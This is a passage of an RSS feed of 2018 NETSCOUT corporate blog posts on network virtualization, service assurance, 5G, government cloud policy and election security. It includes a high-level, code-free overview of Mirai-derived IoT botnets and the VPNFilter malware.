<p>The current changes in networking, born from virtualization and abstraction of compute and cloud resources, greatly benefit communications service providers (CSPs). But they also mean major upheaval from the traditional, siloed way of building network infrastructure and management platforms. Introducing new software-based platforms and applications adds to the complexity of delivering services to telecoms customers. To deliver service agility in today's hybrid networking environment, a new level of service assurance must be included in network design principles: it must be cloud based and automated, include analytics, and be monitored in real time over open platforms.&nbsp;</p>

<p><strong>Service assurance needs to evolve for hybrid networks</strong></p>

<p>The complexity of the network operating environment increases as SDN/NFV deployments are more tightly integrated into the network, so CSPs can no longer treat NFV deployments as siloed software integrations. CSPs will be required to manage, orchestrate, and assure services delivered over physical and virtual network functions sourced from multiple vendors; therefore, any service assurance solution will need to be cross domain (i.e. able to support both the physical and virtual networking environments).&nbsp;</p>

<p>With dynamic service and network configuration taking place within a complex operating environment, identifying where faults or performance issues originate will be one of the biggest challenges for CSPs. Service assurance platforms will need to be intelligent enough to identify if a fault is at the virtual network function (VNF), physical network function (PNF), or cloud infrastructure level if they are to assure the reliability and quality of services in a hybrid environment. End-to-end service management will be crucial in this context, especially as CSPs aspire to the real networking end game: closed-loop automation. This will require real-time capabilities, tighter integration with other elements in the stack, more reliable inventory information, an increased role for analytics and security, and a more policy-driven approach.</p>

<p>The evolving service assurance opportunity is generating significant interest, attracting vendors with network or telco IT backgrounds, as well as those with analytics and automation capabilities. Although vendors may be lining up to provide support with next-generation service assurance, it will not be enough just to deliver on the capabilities already mentioned above; it will be crucial to come to market with offerings that can deal with the increasing complexity of the partnership ecosystem. This will require service assurance solutions that are not just well integrated with other systems but able to deal with the wide variety of proprietary and open source standards and embrace open APIs.</p>

<p>This virtualization of everything above physical transport significantly increases network service assurance complexity; and with this complexity comes CSPs' fear of performance issues and service disruption.&nbsp;If CSPs partner to rearchitect their service assurance systems for a hybrid NFV environment, they will not only lower network operating costs, but will also meet the growing customer demand for on-demand service delivery – the key to the new revenue potential from NFV-based services.&nbsp;</p>

<p>To learn more visit the<a href="https://www.netscout.com/nfv-smarter-video/?ls=PR-MKTG&amp;lsd=blog-100818-1"> NETSCOUT NVF Smarter page</a></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/shutterstock_1123088558.jpg" length="529942" type="image/jpeg"/>
    <guid isPermaLink="false">89b55fd6-d266-400b-8c7f-09793d840e71</guid>
    <pubDate>Mon, 22 Oct 2018 09:00:00 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>Know your network. Extracting the benefits of virtualization</title>
  <link>http://localhost:7996/blog/know-your-network-extracting-benefits-virtualization</link>
  <description>To gather the knowledge they need and leverage it to optimize their networks, service providers need to change the way they run their networks, concurrently along multiple dimensions.</description>
  <content:encoded><![CDATA[<p>By Monica Paolini, Senza Fili</p>

<p>Wireless networks require a huge financial investment and effort to deploy and operate. As the number of use cases, the traffic load, and the adoption of real-time applications increase, the end-to-end network infrastructure will become even more expensive and more complex to manage. To extract as much value as possible from existing networks, service providers have to actively optimize them, not just to increase capacity or speed or to reduce latency, but also – and more crucially – to improve the overall performance as perceived by the subscriber and to manage traffic based on application requirements.</p>

<p>Optimization in today’s wireless networks is still very limited. Service providers have little flexibility in the allocation of network resources, and the best they can do is to push through as much traffic as their networks allow, circumventing any bottlenecks as traffic goes from the core to the devices. Fixed resource allocation (i.e., of functions tied to hardware elements) creates inherent inefficiencies, because each hardware element has to meet peak traffic requirements, operating at less than full utilization the rest of the time. </p>

<p>With virtualization, system operators can avoid this problem by optimizing the allocation of network resources on the basis of application and service requirements, and traffic demand. This flexibility gives service providers more value from their networks in terms of subscriber experience, return on investment, and ability to roll out and support new services. </p>

<p>With NFV and SDN, service providers can dynamically optimize resource allocation as a function of the traffic load. When they add automation, they can move a step further and fully realize the benefits from agility and flexibility. They can fine tune the networks as capacity and latency requirements, distribution of applications and services, network conditions, subscriber density and use patterns change over time. With this fine-tuning, performance in a virtualized network will exceed that of a legacy network with comparable processing, storage, and radio capabilities. Service providers still need to plan networks to meet end-to-end peak capacity, but they no longer need to plan for peak for each network element. As a result, a network expansion may require less equipment to meet the same performance requirements, and this translates into cost savings.</p>

<p>Yet there is a price to pay. Non-virtualized, legacy networks are static, and their performance is relatively easy to track because they are predictable and stable. Service providers have decades of experience in planning, managing and monitoring these networks – and in identifying and resolving issues as they arise. Virtualized networks are dynamic and can adapt to network conditions and traffic requirements, but they are more complex. Service providers have to learn to manage and monitor their networks in a new way if they want to get the benefits that virtualization promises. If they continue to manage virtualized networks as if they do with their static, legacy networks, the gains from virtualization are limited. </p>

<p>The most fundamental challenge is for service providers to get to know their networks – how they work, how they fail, how they can get fixed, how they can improve. On the surface, service providers have all the information they need in front of them: it is all in their networks. But the amount of data they get from their networks is dazzlingly large, and they need to sift through it to identify what data is relevant and will give them a true knowledge of network conditions, not just a collection of KPI metrics. </p>

<p>To gather the knowledge they need and leverage it to optimize their networks, service providers need to change the way they run their networks, concurrently along multiple dimensions.</p>

<p><strong>A user-centric perspective.</strong> The goal of service providers is to provide the best experience to their subscribers and, increasingly, to their IoT clients. To achieve that, they need end-to-end visibility in their networks. Network performance should be assessed from the subscribers’ viewpoint: are they getting the performance they expect for the applications and services they use? Here, it is the perceived performance that matters most – what the user sees, not what goes on inside the network. These two aspects are related, but service providers that track performance only inside the network cannot capture users’ perceived experience. The network may work perfectly well – good KPIs, no network disruption – and yet the user experience may not be good for some applications, or the performance for some services may not meet the requirements. Downloading a big attachment may work well, but voice call quality might be bad.</p>

<p><strong>Service-based granularity. </strong>Monitoring performance at the network level (e.g., throughput, latency, dropped calls) or at a function level is still necessary, but that has to be put into the context of how it contributes to the user experience for specific services and applications, or how it relates to variable performance requirements for IoT applications. For instance, the expected performance may be different for conversational video, video streaming, and video downloads. Video content is served in all three cases, but the latency requirements, for instance, are very different: video downloads are not affected by high latency in the same way conversational video is. </p>

<p><strong>End-to-end monitoring and service assurance.</strong> To adopt a user-centric perspective, service providers have to look at the end-to-end network and drill down to different network areas, at different depths, for root-cause analysis and issue resolution. In complex dynamic networks, multiple and variable interactions shape the perceived user performance for each service used. <a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="ede67472-a71e-43fb-8392-1300a8059391" href="http://localhost:7996/solutions/network-performance-management" target="_blank" title="Network Performance Management in a Complicated Environment">network monitoring</a> and service assurance have to relate the end-to-end, high-level, experience as perceived by the user, to the performance of individual network element or functions and at their interactions across the network. Going back to the previous examples, a service provider needs to know if the voice call quality or latency for conversational video is negatively affected by other traffic.</p>

<p><strong>Real-time </strong><strong>network</strong><strong> management</strong><strong> and resource </strong><strong>allocation</strong><strong>.</strong>Because virtualized networks are dynamic, service providers have to run them, optimize them and fix them in real time. The time resolution will vary depending on the task and the service provider’s capabilities and strategic choices, but the move to real time is crucial for reaping the benefits of virtualization’s flexibility. Real-time resource allocation makes it possible to increase network utilization, and this increases cost and performance efficiency. The causes of bad voice call quality or high latency for video will vary depending on network conditions, traffic composition, and service requirements, and the remedies will vary accordingly.</p>

<p><strong>Closed-loop automation.</strong> Managing complexity is not easy. All the changes required by dynamic networks create a massive increase in the amount of data the scope of data analysis, and the number of actions a service provider has to deal with. Closed-loop automation is necessary to manage this new workload. Automation is much more than an expedient way to relieve staff of repetitive tasks or reduce labor costs. Closed-loop automation gives service providers the knowledge they need about their virtualized networks at multiple granularity levels. It enables them to use this knowledge to troubleshoot and optimize their networks – and to keep learning and honing their ability to improve network performance. Network virtualization both enables and requires automation to be an incremental and ongoing process, in which learning and optimization continue through time and strengthen each other.</p>

<p>Learn how NETSCOUT extracts the benefits of virtualization with its <a href="https://www.netscout.com/nfv-smarter-video/?ls=PR-MKTG&amp;lsd=blog-101718-1">NFV Smarter solution</a>.</p>

<p><em>Monica </em><em>Paolini</em><em>, PhD, is the founder and president of </em><a href="https://senzafili.com/"><em>Senza Fili</em></a><em>. </em><em>Senza Fili provides advisory support on wir</em><em>eless technologies and services</em><em>. </em></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/shutterstock_1061069282.jpg" length="468360" type="image/jpeg"/>
    <guid isPermaLink="false">42858007-1d90-4902-ab80-bb197c724dd1</guid>
    <pubDate>Wed, 17 Oct 2018 09:00:00 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>IoT Botnets: The Dark Side of Open Source </title>
  <link>http://localhost:7996/blog/iot-botnets-dark-side-open-source</link>
  <description>Without question, open-source software has been a boon to developers everywhere. Once viewed as a kind of anarchy in the commercial software world, its early proponents have long since been vindicated, as open source gained mainstream respectability on the strength of popular platforms like Linux, Apache and Firefox. Commercial developers have widely embraced open-source...</description>
  <content:encoded><![CDATA[<p>Without question, open-source software has been a boon to developers everywhere. Once viewed as&nbsp;a kind of anarchy&nbsp;in the commercial software world, its early proponents have long since been vindicated,&nbsp;as open source gained mainstream respectability on the strength of popular platforms like Linux, Apache&nbsp;and Firefox. Commercial developers have widely embraced open-source components&nbsp;for their flexibility, cost savings, and&nbsp;the support of the&nbsp;vast&nbsp;open-source community.</p>

<p>As with so many technology success stories, however, there’s a dark side to open source as well.&nbsp;The core principle of open source is that it is made freely available to anyone for any purpose – in most cases, with wholly benign intentions.&nbsp;But not always.</p>

<p>The source code for Mirai was published on September 30, 2016, and quickly&nbsp;became&nbsp;the&nbsp;framework&nbsp;for malware targeting devices in the Internet of Things. IoT networks and devices have proliferated rapidly – an estimated 27&nbsp;billion had been connected by&nbsp;the end of 2017. In the rush to connect everything and unlock the power of collected data, security has often been an afterthought, and IoT devices tend to be notoriously vulnerable.&nbsp;As a result, they have become a favorite target of hackers seeking entrée into the enterprise networks to which they are ultimately connected. Through automated, worm-like&nbsp;schemes, malware built around the open-source Mirai code can quickly commandeer hundreds of devices into IoT botnets and use them for launching attacks both within and&nbsp;outside of&nbsp;the hosting organization.</p>

<p>In the first annual&nbsp;<a href="https://www.netscout.com/threatreport?ls=PR-MKTG&amp;lsd=blog-101618-1">NETSCOUT Threat Intelligence Report</a>, our researchers&nbsp;noted that IoT botnet authors&nbsp;have used Mirai to build at least five known variants with catchy names. Satori, for instance, leverages remote code injection exploits to enhance the Mirai code. The builders of JenX, in contrast, removed several features from the code and rely on external tools for scanning and exploitation.</p>

<p>OMG was also added to the Mirai legacy. OMG adds a novel feature in the form&nbsp;of an HTTP and SOCKS proxy. This proxy feature allows the infected IoT device&nbsp;to act as a pivot point, which gives the bot author the flexibility to launch&nbsp;additional scans for new vulnerabilities or additional attacks without having to&nbsp;update the original binary. Depending on the type of IoT device and how it is&nbsp;connected, the bot author can pivot to private networks that are connected&nbsp;to the infected IoT device. In other words, an organization’s own IoT devices can be used against them as they to launch attacks within their network towards their assets.</p>

<p>Another variant, Wicked, appeared in May 2018, targeting Netgear routers and CCTV-DVR devices. The newest spawn of Mirai is IoTrojan, which exploits a remote code execution vulnerability in Huawei HG532 routers.</p>

<p>Reaper partially borrows some Mirai source code, but is significantly different from Mirai in several key behaviors, including an evolution that allows Reaper to more stealthily enlist new recruits and more easily fly under the radar of security tools looking for suspicious activity on the local network.</p>

<p>Leveraging and modifying open source malware is not new and only limited to Mira. For example, last month, the VPNFilter IoT malware took the game up a notch after infecting half a million routers across 54 countries.&nbsp;VPNFilter – which affected Linksys, MikroTik, NETGEAR, TP-Link and QNAP network devices and borrowed from the previously-observed Black Energy malware attributed to Russian hackers.&nbsp;</p>

<p>The goal of the VPNfilter malware is not to simply use the compromised IoT device to launch a DDoS attack. The VPNFilter malware is much more sophisticated as it uses multiple third stage operations after the initial infection. One such function of VPNFilter is to conduct a classic man-in-the-middle attack by ‘sniffing’ network data on a network connected to the infected device, and gather credentials, supervisory control and data. The data is then encrypted and exfiltrated via a Tor network. It can also serve as a relay point to hide the origin of subsequent attacks.</p>

<p>As IoT devices continue to multiply, we can expect IoT botnets to flourish, become weaponized&nbsp;and spread like a&nbsp;gruesome&nbsp;mold; to&nbsp;be used by not only your run of the mill&nbsp;hacktivists&nbsp;but&nbsp;well-organized&nbsp;nation-state APT groups.&nbsp;At a minimum, it is critical for operators of IoT networks to establish policies and follow best practices around patches and updates to seal off the most basic device vulnerabilities. Beyond that, recognizing the enormous power IoT botnets are capable of, security professionals need to have pervasive visibility into all corners of their networks and deploy multi-layered DDoS defenses capable of detecting and thwarting both stealthy and brute-force attacks.&nbsp;Teams should also have a global threat intelligence resource to better understand the IoT botnet phenomenon and recognize the characteristics of a campaign taking shape.</p>

<p>Just as drug chemistry has yielded both life-saving miracles and deadly narcotics, the open source movement has not been without negative consequences, however unintended. Bad actors are as clever as they are&nbsp;malicious and&nbsp;will employ any means available to exploit the networks on which commerce and everyday interaction increasingly depend. Vigilance and a powerful defense posture are essential to protect against the growing IoT botnet threat.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/security">Security</category>
    <enclosure url="http://localhost:7996/sites/default/files/darkside%20of%20moon.jpg" length="361328" type="image/jpeg"/>
    <guid isPermaLink="false">452219c0-2eb6-497d-89a7-a5f7d879e9e3</guid>
    <pubDate>Tue, 16 Oct 2018 21:00:00 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Tom Bienkowski</dc:creator>
    </item>
<item>
  <title>Cloud First No More, Cloud Smarter Instead</title>
  <link>http://localhost:7996/blog/cloud-first-no-more-cloud-smarter-instead</link>
  <description>According to an article on NextGov.com, “The new strategy will update the Obama administration’s “Cloud First” policy, established in 2010, to better reflect where agencies and the technology are today. Seven years ago “was a time when cloud computing was still new,” Federal Chief Information Officer Suzette Kent said during a roundtable with reporters Monday. “Many agencies...</description>
  <content:encoded><![CDATA[<p>According to an article on <a href="https://www.nextgov.com/">NextGov.com</a>,</p>

<p><em>“The new strategy will update the Obama administration’s “Cloud First” policy, established in 2010, to better reflect where agencies and the technology are today. Seven years ago “was a time when cloud computing was still new,” Federal Chief Information Officer Suzette Kent said during a roundtable with reporters Monday. “Many agencies were early in their journey in adopting those technologies and we’ve learned a substantial amount within the federal government, as well as <strong><u>the capabilities in the industry, which have significantly advanced.</u></strong>”</em></p>

<p>The strategy RFC adds, “<em>Much of the previous guidance on the topic of cloud technology focused on potential benefits instead of realizing outcomes.</em>” And, although consisting of many components, it highlights application (suitability for) migration, security, and workforce. The U.S. government is not alone in its approach. We have been hearing similar approaches from our large customers, who have replaced the lift and shift strategy with refactoring of application code to take advantage of cloud technology and careful planning for security, management, governance all of which depend on good data before, during, and after migration. </p>

<p>In its latest white paper, “<a href="https://www.onug.net/app/uploads/2018/05/ONUG-Monitoring-Analytics-White-Paper-2018.pdf"><em>A Roadmap for End-to-End Monitoring of Enterprise Applications in Hybrid Multi-Cloud</em></a><em>”, </em>ONUG Monitoring &amp; Analytics working group identifies wire data, machine data, and legacy data sources as the basis for enterprise management. The early cloud adopters were at a disadvantage however. Cloud providers only offered machine data; voluminous amounts of cryptic machined data that had to be stored and mined for intelligence after the fact at significant cost. </p>

<p>No wonder that the RFC highlights application (suitability for) migration, security, and workforce! All three were impacted by lack of high-fidelity wire data before and after migration. But there is hope! Ms. Kent is correct in saying, “<strong><em><u>the capabilities in the industry, which have significantly advanced.</u></em></strong><em>” </em></p>

<p>High fidelity low noise wire data is now available virtually across all cloud providers. This bears a pause and re-examination of earlier tooling strategies. In light of the mandate for smarter cloud adoption let’s examine the impact of high fidelity wire data on each area.</p>

<p><strong>Application</strong><strong> (suitability for) migration</strong></p>

<p>This is part understanding the application code for suitability to take advantage of cloud technology and part discovering and documenting all application components, their dependencies, data gravity issues, communication habits of application components and its user communities; and, still part having baselines of user-experience for those user communities. This work has to be maintained after migration on an on-going basis. Yet, outside code review, wire data is the only basis for solutions that provide these answers. If the metric you seek is a byproduct of communication, machine data cannot help you; you need wire data!</p>

<p><strong>Security</strong></p>

<p>Monitoring is part and parcel of any security strategy. Again, without wire data one’s defenses are handicapped. As in the real world, cybercrime travels into your systems, migrates, reaches out for command and control servers, and exfiltrates data. A log entry tells you that your perimeter has been infiltrated; a server compromised. In other words it is telling you that the criminals are already in your house. That is if you happened to have programmed the proper rules to decipher machine data for that particular attack. Conversely, wire data has the ability to catch the cyberattacks in motion and even stop them authoritatively before breaching the premier. Best part: it has a much lower cost of ownership!</p>

<p><strong>Workforce</strong></p>

<p>A year ago I wrote extensively about the workforce challenges in my blog, “<a href="https://www.onug.net/blog/service-assurance-hybrid-cloud-affordable-tco/"><em>Service Assurance in Hybrid Cloud at an Affordable TCO</em></a>”. The frequency of research reports sighting skilled staff shortage has only increased recently. One area that you could cloud smarter is through a unified management strategy that extends from your traditional infrastructure into the cloud as opposed to a fractured one. By doing so you leverage your existing workforce with deep domain expertise to manage application services on both legacy and cloud infrastructures. No need for new staff, expensive training and ramp up time, and most importantly retaining highly knowledgeable staff!</p>

<p>Cloud adoption is maturing before our eyes. And, Regardless who’s Cloud Maturity Model (CMM) one considers, the key gates can be summarized into Planning (inclusive of architecture, workforces, cost, governance, management, security, risk &amp; compliance), Implementation (inclusive of monitoring and security), and Optimization (inclusive of cost). Our own ONUG Hybrid Multi-Cloud (HMC) working group published the following cloud adoption framework last year.</p>

<p><a href="http://www.onug.net"><img alt="ONUG guidelines" data-entity-type="file" data-entity-uuid="53338b20-a868-4a98-b720-bcd711cdcaa1" src="http://localhost:7996/sites/default/files/inline-images/ONUG%20Fall%202017.jpg" /></a></p>

<p>While the entire framework is a data-intensive one for decision-making and operations, early cloud had an adverse effect on the availability that data forcing all enterprise to adopt a fragmented tool strategy against a back drop of severe shortage of skilled staffing levels that continue to persist. The issue is further exacerbated by the fact that different cloud providers have different data strategies for monitoring and security data.</p>

<p>According to IDC in 2017, cloud spend by IT edged out spend by Shadow IT or the line of business. This is a good development for the industry. Successful migration to the cloud is of strategic value for to the business. IT is well positioned to step up with all it experience in governance, management and security.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/hybrid-cloud-1200x480.jpg" length="227985" type="image/jpeg"/>
    <guid isPermaLink="false">b0516d30-0007-4b3b-8ecb-bed3e83504b7</guid>
    <pubDate>Mon, 15 Oct 2018 09:00:00 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Babak Roushanaee</dc:creator>
    </item>
<item>
  <title>The Expansion of 5G Will Necessitate Service Assurance</title>
  <link>http://localhost:7996/blog/5G-expansion-will-need-service-assurance</link>
  <description>The promise of 5G is enticing. There’s no doubt that the low latency, high bandwidth of 5G will be a game-changer in today’s rapidly transforming digital world. However, for service providers, the challenge is in justifying the multi-billion dollars of investments in new network equipment required without sufficiently defined business cases. According to World Economic Forum...</description>
  <content:encoded><![CDATA[<p>The promise of 5G is enticing. There’s no doubt that the low latency, high bandwidth of 5G will be a game-changer in today’s rapidly transforming digital world. However, for service providers, the challenge is in justifying the multi-billion dollars of investments in new network equipment required without sufficiently defined business cases.</p>

<p>According to World Economic Forum/Accenture analysis based on data from the S&amp;P Capital IQ, $2 trillion in network investments is going be needed over the next decade to meet growing demand. This investment burden will fall on service providers even though 5G profitability is not guaranteed with the use cases that are currently understood.</p>

<p>As the telecom industry begins rolling out network functions virtualization (NFV) and software defined networks (SDN) on the road to a virtualized infrastructure, providers must grapple with managing this new infrastructure along with previous generations of mobile and fixed network technologies. With different vendors using proprietary software and tools, infrastructures are enormously fragmented, adding to the challenge for providers.</p>

<p>Because consumer 5G devices won’t be hitting the market until at least 2019, some service providers are hoping to recoup investments supporting large scale machine-to-machine (M2M) communication. Others are looking to big video such as 4k streaming, as well as critical or reliable communications that require very high levels of resilience or are reliant on achieving key performance indicators (KPIs).</p>

<p>With virtualization of the evolved packet core (EPC) and session border controllers (SBC), service chaining, and orchestration plus the move to cloud platforms, the landscape for service providers has become extremely complicated. Existing and emerging use cases will require high levels of service assurance to ensure maximized availability, uptime, and quality. However, managing these attributes presents further challenges. For this reason, increased automation of operations will be needed in service management as well as network management.</p>

<p>In order to tackle the considerable challenges ahead, service providers will require smart visibility into increasingly disrupted architectures. Software solutions that provide end-to-end, multi-layer, multi-domain coverage are the best answer. Instead of costly hardware probes that must be deployed at every device, virtual probes that produce smart data, supported by intelligent tools, can embed much needed visibility into new networks.</p>

<p>“Always on” smart data tools are ideal because they won’t miss key data points, while at the same time reliably delivering actionable insights. Such automated tools rely on advanced data analytics capabilities and built-in intelligence to uncover only the relevant data for analysis, rather than collecting an overwhelming mountain of irrelevant data.</p>

<p>For service providers that are rolling out 5G, having fast and accurate smart data tools can deliver critical visibility into the performance characteristics of any given service. This invaluable knowledge provides the foundation for service failures to be fixed in near real-time. Obtaining this level of service assurance will be absolutely vital in order for service providers to accelerate their use of virtualized infrastructure to make deployment and operation of enabling technologies, and 5G in particular, cost-effective and successful.</p>

<p>To learn more visit the<a href="https://www.netscout.com/nfv-smarter-video/?ls=PR-MKTG&amp;lsd=blog-100818-1" target="_blank"> NETSCOUT NVF Smarter page</a>.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/100818%20bruce%205G.jpg" length="712603" type="image/jpeg"/>
    <guid isPermaLink="false">74758eb6-a12e-4777-b8a1-158a0a176448</guid>
    <pubDate>Wed, 10 Oct 2018 09:00:00 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Bruce Kelley</dc:creator>
    </item>
<item>
  <title>Cybersecurity and Elections: What can be done?</title>
  <link>http://localhost:7996/blog/cybersecurity-and-elections</link>
  <description>Elections systems are like banks, in that our faith in their security matters almost as much as the actual security itself. As we are beginning to learn, if you undermine that faith, you can do a lot of damage. One only needs to turn on cable news for a few minutes to realize that our nation’s adversaries have proven they can attack our elections and be effective. On the other...</description>
  <content:encoded><![CDATA[<p>Elections systems are like banks, in that our faith in their security matters almost as much as the actual security itself. As we are beginning to learn, if you undermine that faith, you can do a lot of damage. One only needs to turn on cable news for a few minutes to realize that our nation’s adversaries have proven they can attack our elections and be effective.</p>

<p>On the other hand, elections systems are unlike banks in that they are often under resourced and lack security expertise. People have been trying to break into banks electronically for years, whereas this seems like a newer issue for elections.</p>

<p>For those who have resources or who are larger targets, like Secretaries of State and national political parties, the <a href="https://www.belfercenter.org/D3P">Defending Digital Democracy Project</a> at Harvard has been leading the way in informing political professionals on cybersecurity. In addition, there are a number of cybersecurity vendors who are offering free services this elections season. As a veteran, I think this is a terrific show of patriotism and I’m very proud that NETSCOUT, the world-wide leader in <a href="https://www.netscout.com/ddos-protection/?ls=PR-MKTG&amp;lsd=blog-100818-1">DDOS protection</a>, is among them.</p>

<p>While a mature strategy and complete security stack are vital, NETSCOUT specifically focuses on ensuring the availability of timely and accurate election results. A major DDOS campaign, which is a time-tested attacker technique, could easily prevent the results of critical elections from being known for hours or even days. While this might not seem like a big deal initially, not knowing which candidate won or which party controls Congress could seriously undermine public faith in the election. That is why we are offering free <a href="https://www.netscout.com/product/arbor-cloud/?ls=PR-MKTG&amp;lsd=blog-100818-2">cloud-based DDOS protection</a> to select elections officials, including relevant threat intelligence, through the November election.</p>

<p>With less than 30 days to go before the congressional midterm elections, here are a few cost-effective steps that campaign and elections officials can take right now:</p>

<ul>
	<li><u>Assume you will be breached</u>. Your campaign is definitely a target and you should just let that sink in. The higher profile the candidate, the bigger the target.</li>
	<li><u>Develop a strategy.</u>&nbsp;Don't make this harder than it needs to be. Just take a look at your campaign and identify your "critical assets." Rank what really needs to be protected (hint: it’s likely communications with your boss) and prioritize that.</li>
	<li><u>Outsource</u>. Are you a security expert? Do you have millions of dollars in overhead to spend on world-class security infrastructure? Probably not (unless maybe you work for Bloomberg). You know who does? Google. Don't home-brew your own infrastructure when Google, Amazon, and Microsoft are much more sophisticated.</li>
	<li><u>The 80/20 Rule</u>. Once you have your strategy, follow the 80/20 rule. Basically, a few simple things will get you 80% of the security you need. Here are some basic (and free) hygiene rules that go a long way:
	<ul>
		<li>Use a strong username and&nbsp;<em>very</em>&nbsp;strong password for everything. Make them unique. Set policies to change passwords every 60 days. If this is hard, which it is, use a password manager like Okta.</li>
		<li>Use multifactor authentication everywhere you can.. If you don't know what MFA is, you better ask somebody.</li>
		<li>Encrypt everything (including using encrypted messaging apps like Signal or Wickr). It's a pain. Everyone hates it. Do it anyway.</li>
		<li>Delete your emails. Do you need to keep every email forever? If not, why keep them around for a hacker to find (see bullet #1)? You can often set rules that auto-delete emails after a set period. Gmail now lets you do this very easily.</li>
	</ul>
	</li>
	<li><u>Prepare your PR strategy</u>. Again, assume you will be compromised. Plan your response ahead of time so you aren't caught flat-footed.&nbsp;</li>
</ul>

<p>With so many other important issues to debate this election season, NETSCOUT is proud to join others in the security community to do our part to ensure the democratic process is safe and secure.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/security">Security</category>
    <enclosure url="http://localhost:7996/sites/default/files/shutterstock_794518426.jpg" length="563344" type="image/jpeg"/>
    <guid isPermaLink="false">bfd69f6c-b1fd-4b23-a42c-bd6f0f238226</guid>
    <pubDate>Tue, 09 Oct 2018 21:00:00 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Mike McNerney</dc:creator>
    </item>
<item>
  <title>The Federal Government Wants to Cloud Smart(er)</title>
  <link>http://localhost:7996/blog/federal-government-wants-cloud-smarter</link>
  <description>The U.S. government just issued a request for comment on its plan for cloud computing adoption across the federal government. The government says it’s time to move from Cloud First to Cloud Smart.</description>
  <content:encoded><![CDATA[<p>The U.S. government just issued a request for comment on its plan for cloud computing adoption across the federal government. The government says it’s time to move from Cloud First to Cloud Smart.</p>

<p>According to an article on <a href="https://www.nextgov.com/" target="_blank">NextGov.com</a>,</p>

<p><i>“The new strategy will update the Obama administration’s “Cloud First” policy, established in 2010, to better reflect where agencies and the technology are today. Seven years ago “was a time when cloud computing was still new,” Federal Chief Information Officer Suzette Kent said during a roundtable with reporters Monday. “Many agencies were early in their journey in adopting those technologies and we’ve learned a substantial amount within the federal government, as well as the capabilities in the industry, which have significantly advanced.”</i></p>

<p>At NETSCOUT, we agree, and we’re flattered. Why? For much of the past year, we have been engaging our customers in a conversation about how we can help them Cloud Smarter.</p>

<p>
<iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" frameborder="0" height="315" src="https://www.youtube-nocookie.com/embed/lMbX8XS_dJs" width="560"></iframe></p>

<p>In the private sector, where slow is the new off, delivering uninterrupted, secure, high-performance services that delight end-users before, during, and after migration of workloads to the public Cloud is often the difference between success and failure. Historically, although the desire for new digital services and modernization in the public sector has been high, the adoption has lagged behind for a number of reasons. Thus, we’re very encouraged by this new focus. Ongoing success will require government teams to keep a few things top of mind.</p>

<p>For starters, the vast interdependencies across the entire service stack, including applications, networks, compute, service enablers and databases, along with the introduction of new technologies, could stress IT beyond the breaking point.</p>

<p>Once a service is deemed better suited for the Cloud, agencies will need to gain insight into existing service performance and security issues quickly – before, during and after migration. With the right level of visibility, and a modern framework that NETSCOUT provides, this can and should be done with confidence. The end result is not only the cost savings of Cloud deployment, but also the security of information and people and the more efficient and effective delivery of mission serving solutions.</p>
]]></content:encoded>
    <enclosure url="http://localhost:7996/sites/default/files/CS-US-State-Agency-banner_0.jpg" length="117662" type="image/jpeg"/>
    <guid isPermaLink="false">28373209-023c-4fba-b662-e9d5795f3c15</guid>
    <pubDate>Tue, 25 Sep 2018 12:52:51 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Kevin Whalen</dc:creator>
    </item>
<item>
  <title>Keeping a UK Government Digital Organisation Running</title>
  <link>http://localhost:7996/blog/keeping-uk-government-digital-organisation-running</link>
  <description>When was the last time your critical services were audited for performance and security? This blog discusses a multidisciplinary approach to how this might be achieved. Efficient applications mean more productivity, more productivity leads to lower cost.</description>
  <content:encoded><![CDATA[<p><em>This blog is the second in a series from Adam Woolhouse, NETSCOUT. The first in the series</em><a href="https://www.netscout.com/news/blog/uk-gov-digital-org/?ls=PR-MKTG&amp;lsd=blog-092018-1"><em> is “Running UK Gov Digital Org.”</em></a></p>

<p>As government departments, agencies and organisations strive for an increasingly paperless environment, the organisations become digital organisations.</p>

<p>When was the last time your critical services were audited for performance and security? This blog discusses a multidisciplinary approach to how this might be achieved.</p>

<p>Efficient applications mean more productivity, more productivity leads to lower cost. Having an effective way of <a href="https://www.netscout.com/voc/business-assurance?ls=PR-MKTG&amp;lsd=blog-092018-2">looking at performance</a> and security issues with an application leads to lower <a href="https://www.netscout.com/case-study/us-insurer-future-proofs-it-netscout?ls=PR-MKTG&amp;lsd=blog-092018-3">Mean Time to Resolve (MTTR)</a> of a problem requiring fewer man-hours and impacting fewer users and stakeholders again lowering costs and increasing efficiencies.</p>

<p>In a complex service with multiple disciplines delivering that service to end users, multiple towers are used to provide this service and pointing the finger to a particular tower when a problem arises leads to time lost in MTTR. The service towers spanned may be an application, networks, infrastructure, data centre, end user, among others. This discipline may see the rise of one further tower called Service Management or Service Integration and Management (SIAM), which may help to pull all the towers together to form a cohesive unit for digital government delivery.</p>

<p>Having a multiple discipline and a cross-tower fault resolution process can help keep the organisation running.</p>

